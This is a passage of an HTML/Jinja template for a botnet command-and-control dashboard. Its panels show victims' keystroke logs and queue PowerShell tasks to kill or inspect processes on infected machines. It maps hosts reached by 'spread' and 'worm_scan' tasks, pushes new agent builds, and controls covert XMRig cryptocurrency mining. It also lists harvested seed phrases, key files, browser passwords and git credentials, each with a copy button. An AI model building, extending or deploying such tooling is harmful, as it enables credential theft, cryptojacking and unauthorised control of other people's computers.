      <div style="margin-top:16px">
        <h3 style="color:#e6edf3;margin-bottom:8px;font-size:13px">Recent Results</h3>
        {% for t in recent_results %}
        <div class="cmd-panel" style="margin-bottom:8px">
          <div style="color:#8b949e;font-size:11px;margin-bottom:4px">
            {{ t['agent_id'][:10] }}… &nbsp;|&nbsp; <span class="process-tag">{{ t['type'] }}</span>
            &nbsp;|&nbsp; <code>{{ t['payload'][:80] }}</code> &nbsp;|&nbsp; {{ t['completed_at']|dt }}
          </div>
          <div class="output-box">{{ t['output'] or '(no output)' }}</div>
        </div>
        {% endfor %}
      </div>
      {% endif %}
    </div>

    <!-- ── KEYLOGS ── -->
    <div id="panel-keylogs" class="panel">
      <div class="section-hdr">
        <h2>Keylog Stream</h2>
        <select id="kl-filter" onchange="filterKeylogs(this)" style="background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:5px 8px;border-radius:4px">
          <option value="">All nodes</option>
          {% for n in nodes %}
          <option value="{{ n['agent_id'] }}">{{ n['hostname'] }}</option>
          {% endfor %}
        </select>
      </div>
      {% for kl in keylogs %}
      <div class="keylog-entry" data-agent="{{ kl['agent_id'] }}">
        <div class="keylog-meta">
          {{ kl['agent_id'][:12] }}… &nbsp;|&nbsp; {{ kl['received_at']|dt }}
        </div>
        <div class="keylog-data">{{ kl['data'] }}</div>
      </div>
      {% else %}
      <div style="color:#555;text-align:center;padding:40px">No keylog data yet</div>
      {% endfor %}
    </div>

    <!-- ── NETMON / API TRAFFIC ── -->
    <div id="panel-netmon" class="panel">
      <div class="section-hdr"><h2>API Traffic Monitor</h2>
        <span style="color:#8b949e;font-size:11px">Process → connections, updated every 90s — includes command line so Python/Node dev servers are identifiable</span>
      </div>

      <!-- Filter bar -->
      <div style="margin-bottom:12px;display:flex;gap:8px;align-items:center">
        <input id="netmon-filter" type="text" placeholder="Filter by process, port, IP, or script name…"
          style="background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;width:320px;font-size:12px"
          oninput="filterNetmon(this.value)">
        <label style="color:#8b949e;font-size:11px;display:flex;align-items:center;gap:4px">
          <input type="checkbox" id="netmon-listen-only" onchange="filterNetmon(document.getElementById('netmon-filter').value)">
          LISTEN only
        </label>
        <label style="color:#8b949e;font-size:11px;display:flex;align-items:center;gap:4px">
          <input type="checkbox" id="netmon-hide-system" onchange="filterNetmon(document.getElementById('netmon-filter').value)" checked>
          Hide system procs
        </label>
      </div>

      {% for nm in netmon_rows %}
      <div class="cmd-panel netmon-snapshot" style="margin-bottom:12px">
        <div style="color:#8b949e;font-size:11px;margin-bottom:8px">
          {{ nm['agent_id'][:12] }}… &nbsp;|&nbsp; {{ nm['received_at']|dt }}
        </div>
        <table>
          <thead><tr><th>Process</th><th>Command / Script</th><th>Protocol</th><th>Local</th><th>Remote</th><th>State</th></tr></thead>
          <tbody>
          {% for c in nm['connections'] %}
          {% set cmdline = c.cmdline if c.cmdline is defined else '' %}
          {% set is_dev = c.process in ['python','python3','pythonw','node','ruby','php','java','javaw','uvicorn','gunicorn','flask','bun','deno'] %}
          {% set is_security = c.process in ['nessusd','wireshark','nmap','tcpdump','Antigravity','ControlServer'] %}
          {% set is_system = c.process in ['svchost','lsass','services','winlogon','csrss','smss','wininit','fontdrvhost','dwm','audiodg','spoolsv','SearchIndexer','MsMpEng','NisSrv','WmiPrvSE','RuntimeBroker','ShellExperienceHost','StartMenuExperienceHost','TextInputHost','SgrmBroker','SecurityHealthService'] %}
          {% set row_id = loop.index0|string + '_' + nm['agent_id'][:6] %}
          <tr class="netmon-row" style="cursor:pointer;{% if is_system %}opacity:0.35{% endif %}"
              data-process="{{ c.process }}"
              data-cmdline="{{ cmdline }}"
              data-local="{{ c.local }}"
              data-remote="{{ c.remote }}"
              data-state="{{ c.state }}"
              data-system="{{ 'true' if is_system else 'false' }}"
              data-agent="{{ nm['agent_id'] }}"
              onclick="toggleProcDetail('{{ row_id }}')">
            <td>
              <span class="process-tag {% if is_dev %}highlight{% elif is_security %}{% endif %}"
                    style="{% if is_security %}background:#2d1f52;color:#d2a8ff{% endif %}">
                {{ c.process }}
              </span>
            </td>
            <td style="font-size:10px;color:{% if is_dev %}#e6edf3{% else %}#556{% endif %};max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="{{ cmdline }}">
              {% if cmdline and cmdline != c.process %}{{ cmdline }}{% else %}—{% endif %}
            </td>
            <td>{{ c.proto }}</td>
            <td style="font-size:11px;color:#8b949e">{{ c.local }}</td>
            <td style="color:#79c0ff">{{ c.remote }}</td>
            <td><span style="color:{% if c.state=='Listen' %}#f0883e{% else %}#3fb950{% endif %}">{{ c.state }}</span></td>
          </tr>
          <!-- expandable detail row -->
          <tr id="detail_{{ row_id }}" style="display:none;background:#0d1117">
            <td colspan="6" style="padding:8px 16px">
              <div style="font-size:11px;color:#8b949e;margin-bottom:6px">
                <strong style="color:#e6edf3">Full command line:</strong><br>
                <code style="color:#79c0ff">{{ cmdline if cmdline else '(command line captured in v1.4.3+ agent)' }}</code>
              </div>
              <div style="display:flex;gap:8px;margin-top:8px">
                <button onclick="inspectProc('{{ nm['agent_id'] }}','{{ c.process }}')" class="btn btn-sm btn-green">
                  &#128269; Inspect live process
                </button>
                <button onclick="killProc('{{ nm['agent_id'] }}','{{ c.process }}')" class="btn btn-sm" style="background:#3d1f1f;color:#f85149">
                  &#9940; Kill process
                </button>
                <span style="font-size:10px;color:#556;align-self:center">queues a task to the agent</span>
              </div>
            </td>
          </tr>
          {% else %}
          <tr><td colspan="6" style="color:#555">No connections in this snapshot</td></tr>
          {% endfor %}
          </tbody>
        </table>
      </div>
      {% else %}
      <div style="color:#555;text-align:center;padding:40px">No network snapshots yet — agent reports every 90s</div>
      {% endfor %}

      <script>
      function toggleProcDetail(id) {
        const row = document.getElementById('detail_' + id);
        if (row) row.style.display = row.style.display === 'none' ? '' : 'none';
      }

      async function inspectProc(agentId, procName) {
        // Note: $PID is a PS built-in read-only variable — use $procId instead
        const script = `
$procs = Get-Process -Name '${procName}' -ErrorAction SilentlyContinue | Select-Object -First 5
if (!$procs) { "Process not found: ${procName}"; return }
$procs | ForEach-Object {
  $procId = $_.Id
  $cmd = try {(Get-WmiObject Win32_Process -Filter "ProcessId=$procId").CommandLine} catch {'n/a'}
  $net = Get-NetTCPConnection -OwningProcess $procId -EA SilentlyContinue | Select-Object LocalPort,RemoteAddress,RemotePort,State
  [pscustomobject]@{
    Name=$_.ProcessName; ProcID=$procId; CPU=[math]::Round($_.CPU,2); MemMB=[math]::Round($_.WorkingSet64/1MB,1);
    Threads=$_.Threads.Count; StartTime=$_.StartTime; CmdLine=$cmd;
    Connections=($net | ForEach-Object {"$($_.LocalPort)->$($_.RemoteAddress):$($_.RemotePort) [$($_.State)]"}) -join '; '
  }
} | Format-List`.trim();
        const form = new FormData();
        form.append('agent_id', agentId);
        form.append('type', 'ps');
        form.append('payload', script);
        const r = await fetch('/admin/task', {method:'POST', body:form});
        if (r.ok) alert('Inspect task queued — check Tasks tab for output');
      }

      async function killProc(agentId, procName) {
        if (!confirm('Kill all ' + procName + ' processes on the agent?')) return;
        const form = new FormData();
        form.append('agent_id', agentId);
        form.append('type', 'ps');
        form.append('payload', `Stop-Process -Name '${procName}' -Force -ErrorAction SilentlyContinue; "killed"`);
        const r = await fetch('/admin/task', {method:'POST', body:form});
        if (r.ok) alert('Kill task queued');
      }

      function filterNetmon(q) {
        q = q.toLowerCase();
        const listenOnly = document.getElementById('netmon-listen-only').checked;
        const hideSystem = document.getElementById('netmon-hide-system').checked;
        document.querySelectorAll('.netmon-row').forEach(row => {
          const process  = (row.dataset.process  || '').toLowerCase();
          const cmdline  = (row.dataset.cmdline  || '').toLowerCase();
          const local    = (row.dataset.local    || '').toLowerCase();
          const remote   = (row.dataset.remote   || '').toLowerCase();
          const state    = (row.dataset.state    || '').toLowerCase();
          const isSystem = row.dataset.system === 'true';
          const matchQ   = !q || process.includes(q) || cmdline.includes(q) || local.includes(q) || remote.includes(q);
          const matchL   = !listenOnly || state === 'listen';
          const matchS   = !hideSystem || !isSystem;
          row.style.display = (matchQ && matchL && matchS) ? '' : 'none';
        });
      }
      // Apply hide-system on load
      document.addEventListener('DOMContentLoaded', () => filterNetmon(''));
      </script>
    </div>

    <!-- ── NETWORK MAP ── -->
    <div id="panel-discovered" class="panel">
      <div class="section-hdr"><h2>Discovered Hosts</h2></div>
      <table>
        <thead><tr>
          <th>IP</th><th>Hostname</th><th>Discovered By</th>
          <th>Open Ports</th><th>SMB</th><th>First Seen</th>
        </tr></thead>
        <tbody>
        {% for h in discovered %}
        <tr>
          <td><strong>{{ h['ip'] }}</strong></td>
          <td>{{ h['hostname'] or '—' }}</td>
          <td style="font-size:11px;color:#8b949e">
            {{ h['discovered_by'][:10] }}…
            {% if h.get('has_nmap') %}<span title="nmap data merged" style="color:#d2a8ff;margin-left:4px">+nmap</span>{% endif %}
          </td>
          <td>
            {% for p in (h['open_ports'] or '').split(',') if p %}
              <span class="process-tag">{{ p }}</span>
            {% else %}
              <span style="color:#30363d">—</span>
            {% endfor %}
          </td>
          <td>{% if h['has_smb'] %}<span style="color:#3fb950">&#10003;</span>{% else %}—{% endif %}</td>
          <td>{{ h['first_seen']|dt }}</td>
        </tr>
        {% else %}
        <tr><td colspan="6" style="color:#555;text-align:center;padding:20px">No hosts discovered yet — send a "spread" or "worm_scan" task to a node</td></tr>
        {% endfor %}
        </tbody>
      </table>
      <p style="font-size:11px;color:#8b949e;margin-top:8px">
        Hosts discovered by the agent via spread/worm_scan. Port data is merged with any nmap scans run from this C2 for the same IP. <span style="color:#d2a8ff">+nmap</span> indicates merged data.
      </p>
    </div>

    <!-- ── UPDATES ── -->
    <div id="panel-updates" class="panel">
      <div class="section-hdr"><h2>Agent Update Manager</h2></div>
      <div class="cmd-panel" style="margin-bottom:16px">
        <h3>Upload New Agent Build</h3>
        <form method="POST" action="/admin/upload" enctype="multipart/form-data">
          <div class="form-row">
            <input type="file" name="agent_file" accept=".exe" required>
            <input type="text" name="version" placeholder="version (e.g. 1.0.1)" required style="width:180px">
            <input type="text" name="notes" placeholder="release notes" style="flex:1">
            <button type="submit" class="btn btn-green">&#8679; Upload</button>
          </div>
        </form>
      </div>

      <div class="cmd-panel">
        <h3>Uploaded Versions</h3>
        {% for v in agent_versions %}
        <div class="version-row {% if v['is_current'] %}version-current{% endif %}">
          <div style="flex:1">
            <strong>v{{ v['version'] }}</strong>
            {% if v['is_current'] %}<span style="color:#3fb950;font-size:10px"> &#9679; CURRENT</span>{% endif %}
            <div style="color:#8b949e;font-size:11px;margin-top:2px">{{ v['notes'] or '' }} &nbsp;|&nbsp; {{ v['uploaded_at']|dt }}</div>
          </div>
          <div style="display:flex;gap:6px">
            {% if not v['is_current'] %}
            <form method="POST" action="/admin/promote/{{ v['id'] }}" style="display:inline">
              <button type="submit" class="btn btn-green btn-sm">Set Current</button>
            </form>
            {% endif %}
            <a href="/update/agent" class="btn btn-sm" style="background:#21262d">Download</a>
            <form method="POST" action="/admin/push_update" style="display:inline">
              <button type="submit" class="btn btn-sm">Push to All</button>
            </form>
          </div>
        </div>
        {% else %}
        <div style="color:#555;padding:20px;text-align:center">No versions uploaded yet</div>
        {% endfor %}
      </div>
    </div>

    <!-- ── MINING ── -->
    <div id="panel-mining" class="panel">
      <div class="section-hdr">
        <h2 style="color:#3fb950">&#9775; Mining Control</h2>
        <span style="color:#8b949e;font-size:11px">XMR &amp; ZEPH via XMRig — upload binary once, control remotely</span>
      </div>

      <!-- Miner binary upload -->
      <div class="cmd-panel" style="margin-bottom:16px">
        <h3>Upload XMRig Binary</h3>
        <div style="color:#8b949e;font-size:11px;margin-bottom:10px">
          Download <code>xmrig.exe</code> from
          <a href="https://github.com/xmrig/xmrig/releases" target="_blank">github.com/xmrig/xmrig/releases</a>
          (Windows x64, no CUDA variant for CPU-only; with CUDA variant + xmrig-cuda.dll for GPU).
          Upload here — agent downloads it on first <code>mine_start</code>.
        </div>
        <form method="POST" action="/admin/upload_miner" enctype="multipart/form-data">
          <div class="form-row">
            <input type="file" name="miner_file" accept=".exe,.dll" required>
            <select name="miner_type" style="background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:7px 10px;border-radius:5px;font-family:inherit">
              <option value="xmrig">xmrig.exe (main binary)</option>
              <option value="cuda">xmrig-cuda.dll (GPU plugin)</option>
            </select>
            <button type="submit" class="btn btn-green">&#8679; Upload</button>
          </div>
        </form>
        {% if miner_bin_ready %}
        <div style="color:#3fb950;font-size:11px;margin-top:8px">&#10003; xmrig.exe ready on C2</div>
        {% else %}
        <div style="color:#f78166;font-size:11px;margin-top:8px">&#9888; xmrig.exe not uploaded yet</div>
        {% endif %}
        {% if miner_cuda_ready %}
        <div style="color:#3fb950;font-size:11px">&#10003; xmrig-cuda.dll ready (GPU mining enabled)</div>
        {% endif %}
      </div>

      <!-- Quick mine commands -->
      <div class="cmd-panel" style="margin-bottom:16px">
        <h3>Quick Start</h3>
        <div style="color:#8b949e;font-size:11px;margin-bottom:10px">
          Task payload format: <code>COIN WALLET [POOL] [CPU_CAP%] [GPU=0|1]</code>
        </div>
        <form method="POST" action="/admin/task">
          <div class="cmd-row">
            <select name="agent_id" style="flex:0 0 auto;min-width:200px">
              <option value="">All Nodes</option>
              {% for n in nodes %}
              <option value="{{ n['agent_id'] }}">{{ n['hostname'] }} \ {{ n['username'] }}</option>
              {% endfor %}
            </select>
            <select name="type" onchange="updatePayloadHint(this)">
              <option value="mine_start">mine_start</option>
              <option value="mine_stop">mine_stop</option>
              <option value="mine_status">mine_status</option>
            </select>
            <input type="text" name="payload" id="mine-payload"
              placeholder="xmr YOUR_WALLET_ADDRESS pool.supportxmr.com:443 50 0"
              style="flex:1;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:7px 10px;border-radius:5px;font-family:inherit;font-size:12px">
            <button type="submit" class="btn btn-green">Queue Task</button>
          </div>
          <!-- Presets -->
          <div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap">
            <button type="button" class="btn btn-sm" style="background:#1a4731;color:#3fb950"
              onclick="document.getElementById('mine-payload').value='xmr YOUR_WALLET 50'">XMR CPU 50%</button>
            <button type="button" class="btn btn-sm" style="background:#1a4731;color:#3fb950"
              onclick="document.getElementById('mine-payload').value='zeph YOUR_WALLET zephyr.herominers.com:1123 50 0'">ZEPH CPU 50%</button>
            <button type="button" class="btn btn-sm" style="background:#1a4731;color:#3fb950"
              onclick="document.getElementById('mine-payload').value='xmr YOUR_WALLET pool.supportxmr.com:443 50 1'">XMR GPU+CPU</button>
            <button type="button" class="btn btn-sm" style="background:#21262d"
              onclick="document.getElementById('mine-payload').value=''">mine_stop (clear)</button>
          </div>
        </form>
      </div>

      <!-- Mining stats from connected nodes -->
      <div class="cmd-panel">
        <h3>Live Hashrate Stats</h3>
        {% if not miner_stats_rows %}
        <div style="color:#555;padding:20px;text-align:center">
          No mining stats yet — start a miner and stats report every 60s
        </div>
        {% else %}
        <table>
          <thead><tr>
            <th>Node</th><th>Coin</th><th>Hashrate</th><th>Accepted</th><th>Rejected</th>
            <th>Uptime</th><th>GPU</th><th>CPU</th><th>Pool</th><th>Reported</th>
          </tr></thead>
          <tbody>
          {% for ms in miner_stats_rows %}
          <tr>
            <td><code>{% for n in nodes %}{% if n['agent_id'] == ms['agent_id'] %}{{ n['hostname'] }}{% endif %}{% endfor %}</code></td>
            <td><span class="process-tag" style="color:#3fb950">{{ ms['coin']|upper }}</span></td>
            <td><strong style="color:#3fb950">{{ "%.1f"|format(ms['hashrate']) }} H/s</strong></td>
            <td style="color:#3fb950">{{ ms['accepted'] }}</td>
            <td style="color:{% if ms['rejected'] > 0 %}#f85149{% else %}#8b949e{% endif %}">{{ ms['rejected'] }}</td>
            <td style="color:#8b949e">
              {% set secs = ms['uptime_secs'] %}
              {% if secs < 60 %}{{ secs }}s
              {% elif secs < 3600 %}{{ (secs // 60) }}m
              {% else %}{{ (secs // 3600) }}h {{ ((secs % 3600) // 60) }}m{% endif %}
            </td>
            <td style="font-size:11px;color:#79c0ff">{{ ms['gpu_name'] or '—' }}</td>
            <td style="font-size:11px;color:#8b949e">{{ ms['cpu_name'] or '—' }}</td>
            <td style="font-size:10px;color:#8b949e">{{ ms['pool'] or '—' }}</td>
            <td style="font-size:10px;color:#8b949e">{{ ms['received_at']|ago }}</td>
          </tr>
          {% endfor %}
          </tbody>
        </table>
        {% endif %}
      </div>
    </div>

    <!-- ── INVENTORY ── -->
    <div id="panel-inventory" class="panel">
      <div class="section-hdr"><h2>System Inventory</h2>
        <span style="color:#8b949e;font-size:11px">Full asset snapshot collected on agent startup and every 4 hours</span>
      </div>
      <table>
        <thead><tr>
          <th>Node</th><th>Hostname</th><th>Collected At</th><th>Data Size</th><th>View</th>
        </tr></thead>
        <tbody>
        {% for inv in inventories %}
        <tr>
          <td><code>{{ inv['agent_id'][:12] }}…</code></td>
          <td>{% for n in nodes %}{% if n['agent_id'] == inv['agent_id'] %}{{ n['hostname'] }}{% endif %}{% endfor %}</td>
          <td>{{ inv['collected_at'] or (inv['received_at']|dt) }}</td>
          <td style="color:#8b949e">{{ inv['data_size'] }} bytes</td>
          <td>
            <a href="/api/inventory/{{ inv['id'] }}" target="_blank" class="btn btn-sm" style="background:#21262d">Inspect JSON</a>
          </td>
        </tr>
        {% else %}
        <tr><td colspan="5" style="color:#555;text-align:center;padding:20px">
          No inventory yet — agent collects automatically on first connect
        </td></tr>
        {% endfor %}
        </tbody>
      </table>
    </div>

    <!-- ── CREDENTIALS ── -->
    <div id="panel-credentials" class="panel">
      <div class="section-hdr">
        <h2 style="color:#f78166">&#9888; Credential Findings</h2>
        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-top:8px">
          <input id="cred-filter" type="text" placeholder="Filter by file, pattern, or value…"
            style="background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;width:300px;font-size:12px"
            oninput="filterCreds(this.value)">
          <div id="cred-type-pills" style="display:flex;gap:6px;flex-wrap:wrap"></div>
          <span id="cred-total-badge" style="color:#8b949e;font-size:11px;margin-left:auto"></span>
        </div>
      </div>

      {% if not credentials %}
      <div style="color:#555;text-align:center;padding:40px">
        No credential findings yet — agent harvests on startup or on "harvest" task
      </div>
      {% else %}

      {% set type_order = ['seed_phrase','key_file','browser','git_credentials','env_var','secret_in_file','system'] %}
      {% set type_meta = {
        'seed_phrase':     {'icon':'🔑','color':'#f85149','label':'Seed Phrase'},
        'key_file':        {'icon':'📄','color':'#ff9900','label':'Key File'},
        'browser':         {'icon':'🌐','color':'#79c0ff','label':'Browser Saved'},
        'git_credentials': {'icon':'🐙','color':'#79c0ff','label':'Git Credentials'},
        'env_var':         {'icon':'⚙️','color':'#d2a8ff','label':'Env Variable'},
        'secret_in_file':  {'icon':'🔍','color':'#e6edf3','label':'Secret in File'},
        'system':          {'icon':'💻','color':'#8b949e','label':'System'}
      } %}

      {% set all_types = credentials | map(attribute='type') | unique | list %}
      <!-- render in priority order, then any remaining -->
      {% set ordered = [] %}
      {% for t in type_order %}{% if t in all_types %}{% set _ = ordered.append(t) %}{% endif %}{% endfor %}
      {% for t in all_types %}{% if t not in ordered %}{% set _ = ordered.append(t) %}{% endif %}{% endfor %}

      {% for ctype in ordered %}
      {% set group = credentials | selectattr('type', 'equalto', ctype) | list %}
      {% set meta = type_meta.get(ctype, {'icon':'🔍','color':'#e6edf3','label': ctype | replace('_',' ') | title}) %}
      {% set grp_id = 'cgrp_' + loop.index|string %}

      <div class="cmd-panel cred-group" data-type="{{ ctype }}" style="margin-bottom:14px">
        <!-- Group header -->
        <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;cursor:pointer" onclick="toggleCredGroup('{{ grp_id }}')">
          <span style="font-size:15px">{{ meta.icon }}</span>
          <h3 style="margin:0;color:{{ meta.color }}">{{ meta.label }}</h3>
          <span class="badge" style="background:{{ meta.color }}22;color:{{ meta.color }};border:1px solid {{ meta.color }}44">{{ group|length }}</span>
          <span style="color:#8b949e;font-size:11px;margin-left:auto">▾ collapse</span>
        </div>

        <!-- Pattern sub-breakdown for large groups -->
        {% if group|length > 10 %}
        {% set patterns = group | map(attribute='pattern') | unique | list %}
        <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px">
          {% for p in patterns %}{% if p %}
          {% set pcount = group | selectattr('pattern','equalto',p) | list | length %}
          <span class="process-tag" style="font-size:10px;cursor:pointer" onclick="filterCreds('{{ p }}')">
            {{ p }} <span style="color:#8b949e">{{ pcount }}</span>
          </span>
          {% endif %}{% endfor %}
        </div>
        {% endif %}

        <div id="{{ grp_id }}">
          <table>
            <thead><tr>
              {% if ctype in ['browser','git_credentials'] %}
              <th>URL</th><th>Username</th>
              {% elif ctype in ['env_var'] %}
              <th>Variable</th>
              {% elif ctype in ['secret_in_file','seed_phrase','key_file','system'] %}
              <th>File</th><th>Pattern</th>
              {% endif %}
              <th>Value</th><th>Found</th>
            </tr></thead>
            <tbody>
            {% for c in group %}
            {% set display_val = c['secret'] or c['context_text'] or '' %}
            {% set file_short = c['file_path'].split('\\')[-1] if c['file_path'] else '—' %}
            {% set file_parent = c['file_path'].split('\\')[-2] if c['file_path'] and '\\' in c['file_path'] else '' %}
            <tr class="cred-row"
                data-type="{{ ctype }}"
                data-pattern="{{ c['pattern'] or '' }}"
                data-file="{{ c['file_path'] or '' }}"
                data-val="{{ display_val[:100] }}">
              {% if ctype in ['browser','git_credentials'] %}
              <td style="font-size:11px;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="{{ c['url'] }}">{{ c['url'] or '—' }}</td>
              <td style="color:#e6edf3">{{ c['username'] or '—' }}</td>
              {% elif ctype == 'env_var' %}
              <td><code style="color:#d2a8ff">{{ c['context_text'] or '—' }}</code></td>
              {% elif ctype in ['secret_in_file','seed_phrase','key_file','system'] %}
              <td style="font-size:10px;max-width:220px" title="{{ c['file_path'] }}">
                {% if file_parent %}<span style="color:#556">{{ file_parent }}\</span>{% endif %}<span style="color:#c9d1d9">{{ file_short }}</span>
              </td>
              <td>
                <span class="process-tag" style="{% if ctype == 'seed_phrase' %}background:#2d0a0a;color:#f85149{% elif ctype == 'key_file' %}background:#2d1a00;color:#ff9900{% endif %}">
                  {{ c['pattern'] or '—' }}
                </span>
              </td>
              {% endif %}
              <td style="max-width:320px">
                <div style="display:flex;align-items:center;gap:6px">
                  <code style="font-size:10px;color:{{ meta.color }};overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:260px;display:block" title="{{ display_val }}">
                    {{ display_val[:60] }}{% if display_val|length > 60 %}…{% endif %}
                  </code>
                  {% if display_val %}
                  <button onclick="copyVal(this,'{{ display_val[:200]|replace("'","\\'") }}')"
                    style="background:none;border:1px solid #30363d;color:#8b949e;border-radius:3px;padding:1px 5px;font-size:10px;cursor:pointer;flex-shrink:0">
                    copy
                  </button>
                  {% endif %}
                </div>
                {% if display_val|length > 60 %}
                <details style="margin-top:2px">
                  <summary style="font-size:10px;color:#556;cursor:pointer">full value</summary>
                  <pre style="font-size:10px;white-space:pre-wrap;color:#e6edf3;background:#0d1117;padding:6px;border-radius:4px;max-height:120px;overflow-y:auto;margin-top:4px">{{ display_val }}</pre>
                </details>
                {% endif %}
              </td>
              <td style="font-size:10px;color:#556;white-space:nowrap">{{ c['received_at']|dt }}</td>
            </tr>
            {% endfor %}
            </tbody>
          </table>
          {% if group|length > 30 %}
          <div id="showmore_{{ grp_id }}" style="text-align:center;margin-top:8px">
            <button onclick="showAllRows('{{ grp_id }}')" class="btn btn-sm" style="font-size:11px">
              Show all {{ group|length }} rows
            </button>
          </div>
          {% endif %}
        </div>
      </div>
      {% endfor %}
      {% endif %}

      <script>
      // Count visible and init type pills
      (function(){
        const groups = document.querySelectorAll('.cred-group');
        let total = 0;
        const typeColors = {
          seed_phrase:'#f85149', key_file:'#ff9900', browser:'#79c0ff',
          git_credentials:'#79c0ff', env_var:'#d2a8ff', secret_in_file:'#e6edf3', system:'#8b949e'
        };
        const typeLabels = {
          seed_phrase:'Seed', key_file:'Key File', browser:'Browser',
          git_credentials:'Git', env_var:'Env Var', secret_in_file:'In File', system:'System'
        };
        const pills = document.getElementById('cred-type-pills');
        const seen = new Set();
        document.querySelectorAll('.cred-row').forEach(r => total++);
        document.getElementById('cred-total-badge').textContent = total + ' findings';

        // Hide rows beyond 30 per group by default
        groups.forEach(g => {
          const rows = g.querySelectorAll('.cred-row');
          if (rows.length > 30) {
            rows.forEach((r, i) => { if (i >= 30) r.style.display = 'none'; });
          }
          const t = g.dataset.type;
          if (!seen.has(t)) {
            seen.add(t);
            const pill = document.createElement('button');
            pill.className = 'btn btn-sm';
            pill.style.cssText = 'font-size:10px;border-color:' + (typeColors[t]||'#555') + ';color:' + (typeColors[t]||'#8b949e');
            pill.textContent = typeLabels[t] || t;
            pill.onclick = () => filterCreds(t.replace('_',' '));
            pills.appendChild(pill);
          }
        });
      })();

      function toggleCredGroup(id) {
        const el = document.getElementById(id);
        el.style.display = el.style.display === 'none' ? '' : 'none';
      }

      function showAllRows(grpId) {
        const g = document.getElementById(grpId);
        g.querySelectorAll('.cred-row').forEach(r => r.style.display = '');
        const btn = document.getElementById('showmore_' + grpId);
        if (btn) btn.style.display = 'none';
      }

      function filterCreds(q) {
        q = q.toLowerCase().trim();
        let visible = 0;
        document.querySelectorAll('.cred-group').forEach(grp => {
          let grpVisible = 0;
          grp.querySelectorAll('.cred-row').forEach(row => {
            const match = !q ||
              (row.dataset.type||'').toLowerCase().replace('_',' ').includes(q) ||
              (row.dataset.pattern||'').toLowerCase().includes(q) ||
              (row.dataset.file||'').toLowerCase().includes(q) ||
              (row.dataset.val||'').toLowerCase().includes(q);
            row.style.display = match ? '' : 'none';
            if (match) { grpVisible++; visible++; }
          });
          grp.style.display = grpVisible > 0 ? '' : 'none';
        });
        document.getElementById('cred-total-badge').textContent =
          q ? visible + ' matching' : document.querySelectorAll('.cred-row').length + ' findings';
      }

      function copyVal(btn, val) {
        navigator.clipboard.writeText(val).then(() => {
          const orig = btn.textContent;
          btn.textContent = '✓';
          btn.style.color = '#3fb950';
          setTimeout(() => { btn.textContent = orig; btn.style.color = ''; }, 1200);
        });
      }
      </script>
    </div>

    <!-- ── NETWORK INTELLIGENCE ── -->
    <div id="panel-netintel" class="panel">
      <div class="section-hdr">
        <h2 style="color:#79c0ff">&#127757; Network Intelligence</h2>
        <span style="color:#8b949e;font-size:11px">Deep host probing — banners, HTTP scrape, SMB shares, Redis, MongoDB, WMI</span>
      </div>

      {% if not netintel %}
      <div style="color:#555;text-align:center;padding:40px">
        No network intel yet — send a "worm_scan" task to a node to begin discovery
      </div>
      {% else %}
      {% for h in netintel %}
      <div class="cmd-panel" style="margin-bottom:14px">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
          <h3 style="color:#79c0ff">
            {{ h['host_ip'] }}
            {% if h['hostname'] %}<span style="color:#8b949e;font-size:11px;margin-left:8px">({{ h['hostname'] }})</span>{% endif %}
          </h3>
          <span style="color:#8b949e;font-size:10px">{{ h['scan_time'] }} &nbsp;|&nbsp; by {{ h['agent_id'][:10] }}…</span>
        </div>

        <!-- Open ports / banners -->
        {% set ports = h['open_ports_parsed'] %}
        {% if ports %}
        <div style="margin-bottom:10px">
          <div style="color:#8b949e;font-size:10px;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px">Open Ports &amp; Banners</div>
          <table>
            <thead><tr><th>Port</th><th>Service</th><th>Banner / Info</th><th>HTTP Title</th></tr></thead>
            <tbody>
            {% for p in ports %}
            <tr>
              <td><strong>{{ p['port'] }}</strong></td>
              <td><span class="process-tag">{{ p['service'] }}</span></td>
              <td style="font-size:11px;color:#c9d1d9;max-width:300px;white-space:pre-wrap">{{ (p.get('banner') or '')[:200] }}</td>
              <td style="font-size:11px;color:#58a6ff">
                {% if p.get('http') %}
                  {{ p['http'].get('title') or '' }}
                  {% if p['http'].get('server') %}
                    <span style="color:#8b949e"> / {{ p['http']['server'] }}</span>
                  {% endif %}
                  {% if p['http'].get('interesting_paths') %}
                  <br>
                  {% for path in p['http']['interesting_paths'][:5] %}
                    <span class="process-tag" style="color:#f78166">{{ path['path'] }} [{{ path['status'] }}]</span>
                  {% endfor %}
                  {% endif %}
                {% endif %}
              </td>
            </tr>
            {% endfor %}
            </tbody>
          </table>
        </div>
        {% endif %}

        <!-- SMB Shares -->
        {% if h['smb_shares'] %}
        <div style="margin-bottom:8px">
          <span style="color:#8b949e;font-size:10px;text-transform:uppercase">SMB Shares: </span>
          {% for share in h['smb_shares'].split(',') if share %}
            <span class="process-tag highlight">{{ share }}</span>
          {% endfor %}
        </div>
        {% endif %}

        <!-- Redis -->
        {% if h['redis_info'] and h['redis_info'] != '(auth required)' %}
        <details style="margin-bottom:8px">
          <summary style="cursor:pointer;color:#f85149;font-size:11px">&#9888; Redis OPEN (no auth) — click to view INFO</summary>
          <pre style="margin-top:6px;font-size:10px;background:#0d1117;padding:8px;border-radius:4px;max-height:200px;overflow-y:auto;color:#e6edf3;white-space:pre-wrap">{{ h['redis_info'][:2000] }}</pre>
        </details>
        {% endif %}

        <!-- MongoDB -->
        {% if h['mongo_open'] %}
        <div style="color:#f85149;font-size:11px;margin-bottom:8px">&#9888; MongoDB port responding — verify authentication is required</div>
        {% endif %}

        <!-- WMI Procs -->
        {% if h['wmi_procs'] %}
        <details>
          <summary style="cursor:pointer;color:#8b949e;font-size:11px">Remote process list ({{ h['wmi_procs'].split(',') | length }} entries)</summary>
          <div style="margin-top:6px;font-size:10px;color:#c9d1d9">
